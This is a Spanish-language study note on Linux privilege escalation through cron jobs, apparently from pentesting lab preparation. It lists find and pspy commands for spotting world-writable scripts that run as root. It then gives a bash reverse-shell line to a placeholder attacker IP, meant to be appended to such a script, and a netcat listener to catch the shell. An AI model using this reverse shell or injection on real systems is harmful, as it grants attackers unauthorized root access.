---
tags:
  - linux
  - privex
  - cronjob
---
## Conceptos Clave (TL;DR)
* Los trabajos cron programan y ejecutan tareas automáticamente en el sistema; sus configuraciones suelen ubicarse en ``/var/spool/``cron o ``/etc/cron.d``.
* El abuso es posible cuando se identifica un script ejecutado por cron (generalmente como root) que cuenta con permisos de escritura globales (world-writable) o para nuestro usuario actual.
* La explotación consiste en añadir comandos maliciosos al final de dicho script (como una reverse shell), logrando que se ejecuten con los privilegios del proceso cron la próxima vez que se dispare.

## Herramientas Clave
* **find:** Utilizado para buscar recursivamente en el sistema de archivos aquellos archivos y directorios sobre los que tenemos permisos de escritura.
* **pspy:** Herramienta de línea de comandos que escanea procfs para monitorear procesos en tiempo real, comandos ejecutados por otros usuarios y trabajos cron, sin requerir privilegios de root.
* **nc (Netcat):** Utilizado para levantar un listener en la máquina atacante y recibir la conexión de la reverse shell.

## Metodología Paso a Paso

1. **Identificación de archivos vulnerables:** El primer paso es enumerar el sistema en busca de archivos y directorios con permisos de escritura (world-writeable). Esto nos indicará qué archivos podemos modificar.
2. **Monitoreo de procesos:** Una vez identificado un script sospechoso (ej. de respaldos), utilizamos pspy para observar la actividad del sistema en tiempo real y confirmar si el script está siendo llamado por una tarea cron programada y con qué privilegios.
3. **Respaldo preventivo:** Antes de realizar cualquier modificación, es indispensable crear una copia de seguridad del script original.
4. **Inyección de payload:** Se edita el script vulnerable añadiendo el comando de reverse shell al final del archivo; esto garantiza que las funciones legítimas del script terminen de ejecutarse antes de que se lance nuestro payload, evitando sospechas o roturas.
5. **Captura de la sesión:** Se inicia un listener local en el puerto especificado y se espera a que la programación de la tarea cron se cumpla, entregándonos una shell con privilegios elevados.

## Cheat Sheet de Comandos

```bash
# Busca desde la raíz (/) archivos (-type f) con permisos de escritura para otros (-perm -o+w), 
# ignorando el directorio /proc para evitar falsos positivos y enviando errores a /dev/null.
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Ejecuta pspy imprimiendo comandos y eventos del sistema de archivos (-pf) 
# y escaneando procfs cada 1000 milisegundos (-i 1000).
./pspy64 -pf -i 1000

# Payload de Bash para una reverse shell. Este comando debe ser anexado al final 
# del script vulnerable reemplazando <ATTACKER_IP> y <PORT> con los valores correspondientes.
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

# Inicia un listener de Netcat en el puerto especificado, a la espera de la conexión entrante 
# desde el script modificado.
nc -lnvp <PORT>
```

## "Gotchas" y Troubleshooting
* Siempre debes tomar una copia del script y/o crear un respaldo del mismo antes de editarlo.
* Asegúrate de agregar tus comandos al final del script para permitir que el script original se siga ejecutando correctamente antes de lanzar la reverse shell.
* Presta atención a las configuraciones de los tiempos en cron. Un administrador puede cometer un error de sintaxis y usar `*/3 * * * *` (ejecutar cada tres minutos) en lugar de `0 */3 * * *` (ejecutar cada tres horas), lo cual afecta directamente el tiempo de espera para recibir la shell.
* pspy es una herramienta pasiva que escanea el sistema de archivos procfs, por lo que no alertará ni requiere ser ejecutado por root para mostrar comandos ejecutados por otros usuarios.